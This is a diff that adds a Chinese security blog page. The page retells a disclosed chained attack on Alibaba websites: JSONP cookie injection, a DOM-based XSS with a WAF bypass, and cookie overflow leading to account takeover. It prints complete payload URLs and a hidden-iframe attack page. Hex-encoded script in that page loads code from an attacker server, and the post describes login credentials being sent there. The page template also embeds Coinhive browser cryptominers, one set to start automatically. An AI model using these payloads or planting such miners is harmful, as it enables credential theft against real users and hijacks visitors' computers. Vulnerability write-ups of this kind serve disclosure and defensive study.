@@ -1,0 +1,716 @@
+<!doctype html>
+<html class="no-js" lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+    
+  绕过WAF实现阿里账户接管 - NIANHUA BLOG
+  
+  </title>
+  
+  
+  <link href="atom.xml" rel="alternate" title="NIANHUA BLOG" type="application/atom+xml">
+    <link rel="stylesheet" href="asset/css/foundation.min.css" />
+    <link rel="stylesheet" href="asset/css/docs.css" />
+    <script src="asset/js/vendor/modernizr.js"></script>
+    <script src="asset/js/vendor/jquery.js"></script>
+  <script src="asset/highlightjs/highlight.pack.js"></script>
+  <link href="asset/highlightjs/styles/github.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+  function before_search(){
+    var searchVal = 'site: ' + document.getElementById('search_input').value;
+    document.getElementById('search_q').value = searchVal;
+    return true;
+  }
+</script>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+<div class="coinhive-miner" 
+    style="height: 80px"
+    data-key="3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo"
+    data-autostart="false"
+    data-whitelabel="true"
+    data-background="#000000"
+    data-text="#eeeeee"
+    data-action="#00ff00"
+    data-graph="#555555"
+    data-threads="4"
+    data-throttle="0.1">
+</div>
+  </head>
+  <body class="antialiased hide-extras">
+    
+    <div class="marketing off-canvas-wrap" data-offcanvas>
+      <div class="inner-wrap">
+
+
+<nav class="top-bar docs-bar hide-for-small" data-topbar>
+
+
+  <section class="top-bar-section">
+  <div class="row">
+      <div style="position: relative;width:100%;"><div style="position: absolute; width:100%;">
+        <ul id="main-menu" class="left">
+        
+        <li id=""><a target="_self" href="index.html">Home</a></li>
+        
+        <li id=""><a target="_blank" href="archives.html">Archives</a></li>
+        
+        </ul>
+
+        <ul class="right" id="search-wrap">
+          <li>
+<form target="_blank" onsubmit="return before_search();" action="https://google.com/search" method="get">
+    <input type="hidden" id="search_q" name="q" value="" />
+    <input tabindex="1" type="search" id="search_input"  placeholder="Search"/>
+</form>
+</li>
+          </ul>
+      </div></div>
+  </div>
+  </section>
+
+</nav>
+
+        <nav class="tab-bar show-for-small">
+  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
+    <span> &nbsp; NIANHUA BLOG</span>
+  </a>
+</nav>
+
+<aside class="left-off-canvas-menu">
+      <ul class="off-canvas-list">
+        
+        <li><a target="_self" href="index.html">Home</a></li>
+        
+        <li><a target="_blank" href="archives.html">Archives</a></li>
+        
+
+    <li><label>Categories</label></li>
+
+        
+            <li><a href="miscellany.html">杂记</a></li>
+        
+            <li><a href="cnvd.html">CNVD</a></li>
+        
+            <li><a href="php.html">PHP</a></li>
+         
+
+      </ul>
+    </aside>
+
+<a class="exit-off-canvas" href="#"></a>
+
+
+        <section id="main-content" role="main" class="scroll-container">
+        
+       
+
+ <script type="text/javascript">
+  $(function(){
+    $('#menu_item_index').addClass('is_active');
+  });
+</script>
+<div class="row">
+  <div class="large-8 medium-8 columns">
+      <div class="markdown-body article-wrap">
+       <div class="article">
+          
+          <h1>绕过WAF实现阿里账户接管</h1>
+     
+        <div class="read-more clearfix">
+          <span class="date">2019/4/16</span>
+
+          <span>posted in&nbsp;</span> 
+          
+              <span class="posted-in"><a href='miscellany.html'>杂记</a></span>
+           
+         
+          <span class="comments">
+            
+
+            
+          </span>
+
+        </div>
+      </div><!-- article -->
+
+      <div class="article-content">
+      <h3 id="toc_0">前言</h3>
+
+<p>这篇文章是关于一些客户端漏洞导致了阿里巴巴在多个网站上的账户被接管。 <br/>
+<img src="media/15553821833628/1049983-20190415123019778-1229982636.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<span id="more"></span><!-- more -->
+
+<h3 id="toc_1">让我们开始</h3>
+
+<p><img src="media/15553821833628/15553824731164.jpg" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+我将介绍一些必要条件，例如JSONP，一些浏览器处理cookies的行为等等</p>
+
+<h3 id="toc_2">攻击</h3>
+
+<p>大多数阿里巴巴的网站加载并执行外部的javascript对象，javascript代码从名为UID的cookie中获取一个值。更多尝试表示，攻击者可以假冒受害者将UID的值更改为payload，从而导致帐户被接管。</p>
+
+<h3 id="toc_3">漏洞发现的简要步骤如下：</h3>
+
+<ol>
+<li>找到一个url（ynuf.alipay.com），返回一个可以在很多阿里巴巴网站上执行的javascript代码。</li>
+<li>实现了上面提到的URL，并返回了cookie在javascript代码中的值。</li>
+<li>搜索* .alipay.com以查找XSS来控制cookie值。</li>
+<li>在子域中找到一个潜在的基于DOM的XSS。</li>
+<li>控制入口点，以绕过两次WAF。</li>
+<li>使用一种不常见的技术来重写cookie的值。</li>
+<li>在其他子域名网站上执行JavaScript代码，例如login.alibaba.com</li>
+<li>写了一个漏洞利用代码来接管alibaba.com上的任何帐户</li>
+<li>在最新版本的谷歌浏览器和Firefox浏览器都对其进行了测试。并在文末附上示范POC。</li>
+</ol>
+
+<h3 id="toc_4">什么是JSONP？</h3>
+
+<p>JSONP是一种传输JSON数据的方法。 </p>
+
+<ul>
+<li>可以加载外部JavaScript对象</li>
+<li>不使用XMLHttpRequest</li>
+<li>不太安全</li>
+<li>绕过浏览器中的同源策略
+<img src="media/15553821833628/15553851176437.jpg" alt="JSONP请求/响应的示例" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></li>
+</ul>
+
+<h3 id="toc_5">易受攻击的外部JavaScript对象  </h3>
+
+<p>阿里巴巴的许多网站从以下网址加载外部JavaScript对象：<br/>
+<code>https://ynuf.alipay.com/uid</code><br/>
+JavaScrip代码： <br/>
+<code>um.__idcb(&quot;5cb143654b94f4a5&quot;)</code><br/>
+<img src="media/15553821833628/1049983-20190415123147531-2132485915.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+仔细观察可以发现<code>5CB143654B94F4A5</code>是从之前在ynuf.alipay.com域中设置的UID cookie中提取的。如果用户拥有cookie，服务器会获取它的值，否则，服务器会在响应中设置值。工作流程如图所示：<br/>
+<img src="media/15553821833628/1049983-20190415123218845-1506146681.png" alt="JSONP在阿里巴巴的两个域中调用" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+看下面三个请求，cookie中的payload会被服务器返回。<br/>
+第一个请求：</p>
+
+<pre class="line-numbers"><code class="language-text">GET /uid HTTP/1.1
+Host: ynuf.alipay.com
+User-Agent: curl/7.47.0
+Accept: */*
+</code></pre>
+
+<p>响应:</p>
+
+<pre class="line-numbers"><code class="language-text">HTTP/1.1 200 OK
+Date: Wed, 17 Oct 2018 17:38:10 GMT
+Content-Type: application/javascript
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+ETag: d181bf00669d40c0
+Set-Cookie: uid=d181bf00669d40c0; expires=Thu, 30 Jan 2031 08:00:00 GMT
+Cache-Control: max-age=315360000, private
+Server: Tengine/Aserver
+Strict-Transport-Security: max-age=0
+Timing-Allow-Origin: *
+
+um.__idcb(&quot;26fadf90bac907a7&quot;)
+</code></pre>
+
+<p>第二个请求:</p>
+
+<pre class="line-numbers"><code class="language-text">GET /uid HTTP/1.1
+Host: ynuf.alipay.com
+User-Agent: curl/7.47.0
+Cookie: uid=d181bf00669d40c0
+Accept: */*
+</code></pre>
+
+<p>响应:</p>
+
+<pre class="line-numbers"><code class="language-text">HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 08:47:40 GMT
+Content-Type: application/javascript
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+ETag: test
+Cache-Control: max-age=315360000, private
+Server: Tengine/Aserver
+Strict-Transport-Security: max-age=0
+Timing-Allow-Origin: *
+
+um.__idcb(&quot;d181bf00669d40c0&quot;)
+</code></pre>
+
+<p>第三个请求:</p>
+
+<pre class="line-numbers"><code class="language-text">GET /uid HTTP/1.1
+Host: ynuf.alipay.com
+User-Agent: curl/7.47.0
+Cookie: uid=&quot;)+alert(&quot;Injected
+Accept: */*
+</code></pre>
+
+<p>响应:</p>
+
+<pre class="line-numbers"><code class="language-text">HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 08:47:40 GMT
+Content-Type: application/javascript
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+ETag: test
+Cache-Control: max-age=315360000, private
+Server: Tengine/Aserver
+Strict-Transport-Security: max-age=0
+Timing-Allow-Origin: *
+
+um.__idcb(&quot;&quot;)+alert(&quot;Injected&quot;)
+</code></pre>
+
+<p>由于没有对cookie值进行过滤，因此可以注入恶意代码。但什么样的漏洞才能导致控制cookie呢？</p>
+
+<h3 id="toc_6">Cookie中的一些问题 </h3>
+
+<p>根据RFC6265的规定，a.b.com可以设置一个属性为.b.com或a.b.com属性的cookie键值，而且访问b.com的时候很自然的.b.com的这个cookie也会被发送过去。<br/>
+简单的来说就是：<br/>
+非顶级域名，如二级域名或者三级域名，设置的cookie的domain只能为顶级域名或者二级域名或者三级域名本身，不能设置其他二级域名的cookie，否则cookie无法生成。<br/>
+顶级域名只能设置domain为顶级域名，不能设置为二级域名或者三级域名，否则cookie无法生成。<br/>
+二级域名能读取设置了domain为顶级域名或者自身的cookie，不能读取其他二级域名domain的cookie。所以要想cookie在多个二级域名中共享，需要设置domain为顶级域名，这样就可以在所有二级域名里面或者到这个cookie的值了。<br/>
+顶级域名只能获取到domain设置为顶级域名的cookie，其他domain设置为二级域名的无法获取。<br/>
+ <img src="media/15553821833628/1049983-20190415123424990-1573664790.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+但是，老外画了一个这个图，吧啦吧啦不知道说了些啥（&amp;……%￥%……&amp;*<br/>
+最后说可以这样设置cookie:<br/>
+<code>uid=&quot;)+alert(&quot;xss;domain=.alipay.com</code></p>
+
+<h3 id="toc_7"> 在*.alipay.com中发现XSS</h3>
+
+<p>通过信息收集发现了doc.open.alipay.com。访问下面的URL将重定用户<br/>
+<code>https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;keyword=foo</code><br/>
+仔细观察URL，发现javascript处理的是重定向而不是3xx头。查看代码还发现，可以通过向查询字符串添加articleID参数来停止重定向<br/>
+<img src="media/15553821833628/15553871556112.jpg" alt="" style="width:1084px;"/><br/>
+触发XSS的第一个简单测试是用双引号来进行绕过<br/>
+<code>https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;keyword=foo&quot;&gt;&amp;articleId=bar</code></p>
+
+<p>结果：<br/>
+<img src="media/15553821833628/1049983-20190415123634541-1442214943.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+XSS过滤原理可能如下：<br/>
+<img src="media/15553821833628/1049983-20190415123744284-1066572162.png" alt="能不能XSS？" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<h3 id="toc_8">JavaScript的魔力  </h3>
+
+<p>在开始之前，我注意到jQuery中的一个难问题。<br/>
+<em>难点描述</em><br/>
+如果jquery通过.val（）从表单中获取HTML编码值，则返回对应的HTML解码值</p>
+
+<pre class="line-numbers"><code class="language-text">&quot;input&quot; value=&quot;&amp;amp;&amp;quot;&quot; /&gt;
+</code></pre>
+
+<p>jQuery：</p>
+
+<pre class="line-numbers"><code class="language-text">$(&#39;#input&#39;).val() // return &amp;&quot;
+</code></pre>
+
+<p>回到查找漏洞的过程中，仔细查看，发现显示关键字的页面部分（在doc.open.alipay.com中）是由javascript完成的，花了很大的精力来查找构建该部分的javascript代码：</p>
+
+<pre class="line-numbers"><code class="language-text">function h(b, e) {
+    url = d.one(&quot;.J_ajaxUrl&quot;).val();
+    var f = &quot;keyword=&quot; + (d.one(&quot;.J_Tagword&quot;) ? d.one(&quot;.J_Tagword&quot;).val() : d.one(&quot;.J_SearchKeyword&quot;).val()) + &quot;&amp;searchType=&quot; + e;
+    url.indexOf(&quot;?&quot;) &gt; 0 ? url += &quot;&amp;&quot;: url += &quot;?&quot;,
+    c({
+        url: url + f + &quot;&amp;current=&quot; + b,
+        type: &quot;post&quot;,
+        dataType: &quot;json&quot;,
+        data: {},
+        success: function(b) {
+            if (200 == b.code) {
+                var c = b.data;
+                c.typeTotals;
+                if (c.count &gt; 0) {
+                    var g = [];
+                    c.results.length &gt; 0 ? (a.each(c.results,
+                    function(a) {
+                        &quot;0&quot; == e ? g.push(&quot;&quot;, &#39;&#39; + a.link + &#39;&quot; target=&quot;_blank&quot;&gt;&#39; + a.title + &quot;&quot;, &#39;&#39; + a.content + &quot;&quot;, &#39;&#39; + a.typeName + &quot;&quot;, &#39;更新时间: &#39; + a.gmtModifiedStr + &quot;&quot;, &quot;&quot;) : g.push(&quot;&quot;, &#39;&#39; + a.link + &#39;&quot; target=&quot;_blank&quot;&gt;&#39; + a.title + &quot;&quot;, &#39;&#39; + a.content + &quot;&quot;, &#39;更新时间: &#39; + a.gmtModifiedStr + &quot;&quot;, &quot;&quot;)
+                    }), d.all(&quot;ul&quot;, &quot;.J_SearchList&quot;).html(g.join(&quot;&quot;))) : d.all(&quot;ul&quot;, &quot;.J_SearchList&quot;).html(&#39;该类目下没有符合条件的搜索结果&#39;),
+                    a.each(d.all(&quot;.J_typeTotal&quot;),
+                    function(a, b) {
+                        var e = d.all(a);
+                        e.parent();
+                        0 == b ? e.text(c.count) : e.text(c[l[b] + &quot;Count&quot;])
+                    }),
+                    0 == e ? k.changeTotalPage(Math.ceil(c.count / c.size)) : k.changeTotalPage(Math.ceil(c[l[e] + &quot;Count&quot;] / c.size)),
+                    k.setCurrentPage(c.current),
+                    d.all(window).scrollTop(0)
+                } else d.all(&quot;li&quot;, &quot;.J_typeList&quot;).show(),
+                d.all(&quot;.J_typeTotal&quot;).text(0),
+                k.changeTotalPage(1),
+                d.one(&quot;#platformId&quot;) &amp;&amp; &quot;1&quot; == d.one(&quot;#platformId&quot;).val() ? d.all(&quot;ul&quot;, &quot;.J_SearchList&quot;).html(&#39;没有符合条件的搜索结果&#39;) : d.all(&quot;ul&quot;, &quot;.J_SearchList&quot;).html(&#39;没有符合条件的搜索结果&#39; + f + &#39;&quot;&gt;搜索淘宝开放平台 --\x3e&#39;)
+            }
+        }
+    })
+}
+</code></pre>
+
+<p>它是链接中最重要的javascript代码。服务器以正确编码输入j_searchkeywork中的参数关键字。但是，第3行<code>d.one(&quot;.J_ajaxUrl&quot;).val()</code>返回的HTML解码值被插入到页面中，目的是注入XSS payload，即使是以HTML编，它也不是一个常用的基于DOM的XSS攻击向量，但是：</p>
+
+<p><img src="media/15553821833628/1049983-20190415123902153-165857318.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<p>构造一个简单的XSS payload。然而，服务器端的数据清洗很烦人。数据处理流程如下：<br/>
+<img src="media/15553821833628/1049983-20190415123934455-648866520.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<h3 id="toc_9">绕过服务器端清洗 </h3>
+
+<p>构造XSS的第一步是添加一个新的HTML标记。不过，服务器已经对关键字参数传递的标记应用了某种规则。</p>
+
+<p>fuzz测试：<br/>
+ <img src="media/15553821833628/1049983-20190415124000636-1737955009.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+结果显示其以下规则和条件：</p>
+
+<p>1.删除属性并关闭有效HTML的标记，<code>&lt;a href&gt;</code>转换成<code>&lt;a&gt;&lt;/a&gt; </code><br/>
+2.无效的标记被递归完全删除或ah&gt;变为无。<br/>
+更多模糊测试：<br/>
+<img src="media/15553821833628/15553940693159.jpg" alt="" style="width:865px;"/></p>
+
+<p> 预期值<code>&gt;</code>和<code>&lt;</code>将转换为<code>&amp;gt;</code>和<code>&amp;lt;</code>。但是，上一个请求/响应显示了其他内容，很快显示服务器正在应用自定义HTML编码器功能<br/>
+1.如果输入未被识别为有效的html编码值 -&gt; html_encode（value）<br/>
+2.如果输入被识别为有效的HTML编码值 -&gt; 返回值<br/>
+这个小问题导致了一个很大的漏洞。其输入是 ： </p>
+
+<pre class="line-numbers"><code class="language-text">uid=&quot;)+alert(&quot;xss;domain=.alipay.co
+</code></pre>
+
+<p><img src="media/15553821833628/1049983-20190415124236149-1729186013.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+然后，输入XSS payload： </p>
+
+<pre class="line-numbers"><code class="language-text">https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;articleId=bar&amp;keyword=&quot;&gt;%26gt;script%26lt;
+</code></pre>
+
+<p>结果却变成了：<br/>
+<img src="media/15553821833628/1049983-20190415124150132-781028666.png" alt="WAF阻断了请求" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<h3 id="toc_10"> 绕过WAF</h3>
+
+<p>利用服务器端清洗功能的第二条规则（删除无效的HTML标记）可以成功绕过WAF。<br/>
+<img src="media/15553821833628/15553920954615.jpg" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/><br/>
+数据流：<br/>
+<img src="media/15553821833628/1049983-20190415124309328-1521143987.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<p>但实际上并不是这样，因为JavaScript发起了另一个Ajax请求。考虑到代码的第10行，前面提到的javascript库依赖于Ajax请求。请求是：</p>
+
+<pre class="line-numbers"><code class="language-text">https://doc.open.alipay.com/doc2/search.htm?platformId&amp;keyword=&quot;&gt;&amp;searchType=0&amp;current=1
+</code></pre>
+
+<p>当检测到有效载荷时，WAF阻止了第二个请求（毫无疑问，任何WAF都应该阻止<code>&quot;&gt;&lt;script&gt;</code>）。错误的提示信息是根据规则库，只有200状态代码才能显示有效负载的响应显示（代码中的第11行）：</p>
+
+<pre class="line-numbers"><code class="language-text">if (200 == b.code) {
+</code></pre>
+
+<p>因此，在两个请求中同时需要一个payload来绕过WAF。这里需要更多的fuzz测试。测试了几种载体。之后，发现了ontoggle这个payload：</p>
+
+<pre class="line-numbers"><code class="language-text">&lt;details/open/ontoggle=JS&gt;
+</code></pre>
+
+<p>这绕过了AJAX请求中的WAF<br/>
+ <img src="media/15553821833628/1049983-20190415124352390-194199861.png" alt=""/><br/>
+所以最后的payload是：</p>
+
+<pre class="line-numbers"><code class="language-text">https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;articleId=bar&amp;keyword=&quot;&gt;%26gt;details%2fopen%2fontoggle=%26lt;
+</code></pre>
+
+<p>这会导致发送第二个Ajax请求：</p>
+
+<pre class="line-numbers"><code class="language-text">https://doc.open.alipay.com/doc2/search.htm?platformId&amp;keyword=&quot;&gt;&lt;details/open/ontoggle=&gt;&amp;searchType=0&amp;current=1
+</code></pre>
+
+<p>这两个请求都可以绕过WAF。答对了！<br/>
+<img src="media/15553821833628/1049983-20190415124422116-1752749738.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/></p>
+
+<h3 id="toc_11">攻击场景：</h3>
+
+<ol>
+<li>构建恶意HTML网页  </li>
+<li>诱骗用户来访问我们制作的恶意网页  </li>
+<li>设置恶意cookie  </li>
+<li>在阿里巴巴的子域中注入了js代码</li>
+<li>获取用户凭证<br/>
+### 漏洞利用问题：<br/>
+由于ynuf.alipay.com将域中的cookie设置为uid名称，因此无法从其他域覆盖该cookie。添加另一个与.alipay.com属性同名的cookie也不能解决这个问题，因为如果一个域存在两个名为xxx的cookie，则默认行为是浏览器将旧cookie放在HTTP请求的前面，这样服务器就可以获取第一个cookie
+<img src="media/15553821833628/1049983-20190415124507426-1136874394.png" alt="" class="mw_img_center" style="display: block; clear:both; margin: 0 auto;"/>
+### 覆盖Cookie  <br/>
+测试显示浏览器在每个域中保存的cookie数量有限。例如，Google Chrome为一个域节省了不到150个cookie，而Firefox则节省了大约200个<br/>
+因此，有效载荷很简单：
+<code>
+for(var i=0;i&lt;1000;i++){<br/>
+document.cookie=i+&#39;=1;domain=.alipay.com&#39;<br/>
+}<br/>
+document.cookie=&#39;uid=foo;domain=.alipay.com;path=/&#39;
+</code>
+因此攻击向量<code>uid</code>通过添加许多垃圾cookie来消除旧cookie，添加<code>uid</code>由payload填充的新cookie。</li>
+</ol>
+
+<h3 id="toc_12">payload 绕waf</h3>
+
+<p>由于WAF阻断了<code>&quot;)+alert(&quot;xss</code>，因此等效值被替换为绕过WAF的编码值：</p>
+
+<pre class="line-numbers"><code class="language-text">document.cookie=&#39;uid=\x22\x29\x2b\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73;domain=.alipay.com;path=/&#39;
+</code></pre>
+
+<h3 id="toc_13"> 组合攻击</h3>
+
+<p>最终的payload比预期的要简单：</p>
+
+<pre class="line-numbers"><code class="language-text">https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;&amp;articleId=bar&amp;keyword=1%22%3E%26lt;details/open/ontoggle=%22for(var+i=0;i%3C1000;i%2b%2b){document.cookie=i%2b%27=1;domain=.alipay.com%27}document.cookie=%27uid=\x22\x29\x2b\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73;domain=.alipay.com;path=/%27%22%3E
+</code></pre>
+
+<p>访问上面的URL会在cookie中注入恶意JavaScript代码，该代码在阿里巴巴公司的多个域中执行，例如：</p>
+
+<pre class="line-numbers"><code class="language-text">https://login.alibaba.com/
+https://passport.alibaba.com/mini_login.htm?appName=hrjob
+https://accounts.alibaba.com/register/cnfm_reg.htm
+https://login.taobao.com/member/login.jhtml
+https://reg.taobao.com/member/reg/fill_mobile.htm
+https://login.aliexpress.com/
+http://tp.amap.com/
+http://id.amap.com/
+https://passport.alibaba-inc.com/ssoLogin.htm?APP_NAME=iworkmanage
+https://ipp.alibabagroup.com/login.htm
+https://mp.dayu.com/
+https://passport.umeng.com/login
+https://passport.damai.cn/loginEn
+</code></pre>
+
+<p>显然，有更多的网站受到影响</p>
+
+<h3 id="toc_14">最后一击</h3>
+
+<p>最终目标是在阿里巴巴的网站上实现账户接管。这种情况首先诱骗用户点击一个链接，然后如果用户下次登录，该帐户将被泄露。触发漏洞的链接源：</p>
+
+<pre class="line-numbers"><code class="language-text">&lt;html&gt;
+&lt;center&gt;
+&lt;img src=&#39;https://pbs.twimg.com/profile_images/701729713392320512/PaYM_TF4_400x400.jpg&#39;&gt;&lt;img&gt;
+&lt;iframe src=&quot;https://doc.open.alipay.com/doc2/docSearch.htm?treeId=300&amp;articleId=bar&amp;keyword=1%22%3E%26lt;details/open/ontoggle=%22for(var+i=0;i%3C1000;i%2b%2b){document.cookie=i%2b%27=1;domain=.alipay.com%27}document.cookie=%27uid=\x22\x29\x2b\x28\x73\x63\x72\x69\x70\x74\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x2c\x73\x63\x72\x69\x70\x74\x2e\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x78\x70\x6c\x2e\x6a\x73\x27\x2c\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x62\x6f\x64\x79\x2e\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64\x28\x73\x63\x72\x69\x70\x74\x29\x29\x2b\x28\x22;domain=.alipay.com;path=/%27%22%3E&quot; style=&quot;width:0;height:0;border:0; border:none;&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>iframe-src使用以下paylaod而不是alert来注入恶意的javascript文件并动态加载：</p>
+
+<pre class="line-numbers"><code class="language-text">&quot;\&quot;)+(script=document.createElement(&#39;script&#39;),script.src=&#39;https://myserver/xpl.js&#39;,document.body.appendChild(script))+(\&quot;&quot;
+</code></pre>
+
+<p>显然，payload位于<code>https://myserver/xpl.js</code>中：</p>
+
+<p>最终，当用户访问攻击者的链接并登录到<code>https://login.alibaba.com/</code>后，凭证将被窃取并保存在<code>https://myserver/xxx/alibaba/data.txt</code>中：</p>
+
+<pre class="line-numbers"><code class="language-text">{&quot;u&quot;:&quot;alibaba@alibaba.com&quot;,&quot;p&quot;:&quot;password&quot;}
+</code></pre>
+
+<p>帐户接管完成</p>
+
+<p>本文引用了</p>
+
+<pre class="line-numbers"><code class="language-text">1.http://cache.baiducontent.com/c?m=9d78d513d99907e91aac837f7d01d6150e54f1743ca6c7140f91d60d84652b564711f4ba57734c548d98292616ae394bea87217347527de88cc8f91a8eeacb3f2ef8796f2d40914163910eafba4527c4229b51edac0ee6cae732e4b9d3a385120c9447423adeffd11c46568b78f1672cfee3dc0d025f67ebb1603ba20c363e9f5411eb18e4b0613f5edfad8000518137d3631495a43eb43d05b564fe59447a&amp;p=8f769a4789d21dff57ec97354e52&amp;newp=9c7a891accaf12a05abd9b7f0e5d92695912c10e36d2c44324b9d71fd325001c1b69e3b823281603d4c6786c15e9241dbdb239256b55&amp;user=baidu&amp;fm=sc&amp;query=https%3A//www%2Ecnblogs%2Ecom/backlion/p/10709961%2Ehtml&amp;qid=ec9147550000b03c&amp;p1=1
+2.https://www.cnblogs.com/xsserhaha/p/10714611.html
+3.https://medium.com/@y.shahinzadeh/chaining-multiple-vulnerabilities-waf-bypass-to-account-takeover-in-almost-all-alibabas-websites-f8643eaa2855
+</code></pre>
+
+
+    
+
+      </div>
+
+      <div class="row">
+        <div class="large-6 columns">
+        <p class="text-left" style="padding:15px 0px;">
+      
+          <a href="15556755538657.html" 
+          title="Previous Post: 记一次上传绕过getshell">&laquo; 记一次上传绕过getshell</a>
+      
+        </p>
+        </div>
+        <div class="large-6 columns">
+      <p class="text-right" style="padding:15px 0px;">
+      
+          <a  href="Burp-Extender-Information.html" 
+          title="Next Post: Burp插件 - 自动标记敏感信息">Burp插件 - 自动标记敏感信息 &raquo;</a>
+      
+      </p>
+        </div>
+      </div>
+      <div class="comments-wrap">
+        <div class="share-comments">
+          <script src="//www.powr.io/powr.js?external-type=html"></script> 
+ <div class="powr-comments" id="113e15fb_1548600768"></div>
+
+          
+
+          
+        </div>
+      </div>
+    </div><!-- article-wrap -->
+  </div><!-- large 8 -->
+
+
+
+
+ <div class="large-4 medium-4 columns">
+  <div class="hide-for-small">
+    <div id="sidebar" class="sidebar">
+          <div id="site-info" class="site-info">
+            
+                <div class="site-a-logo"><img src="https://avatars1.githubusercontent.com/u/41846038" /></div>
+            
+                <h1>NIANHUA BLOG</h1>
+                <div class="site-des">低级信息安全研究员</br>低级硬件工程师</div>
+                <div class="social">
+
+
+
+
+
+
+
+
+
+<a target="_blank" class="github" target="_blank" href="https://github.com/nian-hua/" title="GitHub">GitHub</a>
+<a target="_blank" class="email" href="mailto:nianhua@mail.com" title="Email">Email</a>
+  <a target="_blank" class="rss" href="atom.xml" title="RSS">RSS</a>
+                
+              	 </div>
+          	</div>
+
+             
+              <!--coinhive-->
+              <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+              <div class="coinhive-miner" 
+                  style="margin-top:20px;height: 250px"
+                  data-key="3CZb3wTC2wAsN0kWehZEi8Tclp38uFBo"
+                  data-autostart="true"
+                  data-whitelabel="true"
+                  data-background="#fafafa"
+                  data-action="#57ad68"
+                  data-threads="4"
+                  data-throttle="0.12"
+              >
+                  <em>Loading...</em>
+              </div>
+              <!--coinhive-->
+              <div id="site-categories" class="side-item " style="padding-top:0px;">
+                <div class="side-header">
+                  <h2>Categories</h2>
+                </div>
+                <div class="side-content">
+
+      	<p class="cat-list">
+        
+            <a href="miscellany.html"><strong>杂记</strong></a>
+        
+            <a href="cnvd.html"><strong>CNVD</strong></a>
+        
+            <a href="php.html"><strong>PHP</strong></a>
+         
+        </p>
+
+
+                </div>
+              </div>
+
+              <div id="site-categories" class="side-item">
+                <div class="side-header">
+                  <h2>Recent Posts</h2>
+                </div>
+                <div class="side-content">
+                <ul class="posts-list">
+	      
+		      
+			      <li class="post">
+			        <a href="15556755538657.html">记一次上传绕过getshell</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15553821833628.html">绕过WAF实现阿里账户接管</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="Burp-Extender-Information.html">Burp插件 - 自动标记敏感信息</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15522026314723.html">Burp API python 版第一部分</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="Remove-Baidu-Hot.html">编写屏蔽百度推荐插件</a>
+			      </li>
+		     
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		  
+		      
+		   
+		  		</ul>
+                </div>
+              </div>
+        </div><!-- sidebar -->
+      </div><!-- hide for small -->
+</div><!-- large 4 -->
+
+</div><!-- row -->
+
+ <div class="page-bottom clearfix">
+  <div class="row">
+   <p class="copyright">Copyright &copy; 2019
+Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
+Visit <a target="_blank" href="http://github.com/nianhua">My GitHub</a>.</p>
+  </div>
+</div>
+
+        </section>
+      </div>
+    </div>
+
+  
+    
+
+    <script src="asset/js/foundation.min.js"></script>
+    <script>
+      $(document).foundation();
+      function fixSidebarHeight(){
+        var w1 = $('.markdown-body').height();
+          var w2 = $('#sidebar').height();
+          if (w1 > w2) { $('#sidebar').height(w1); };
+      }
+      $(function(){
+        fixSidebarHeight();
+      })
+      $(window).load(function(){
+          fixSidebarHeight();
+      });
+     
+    </script>
+
+    
+
+
+
+  </body>
+</html>
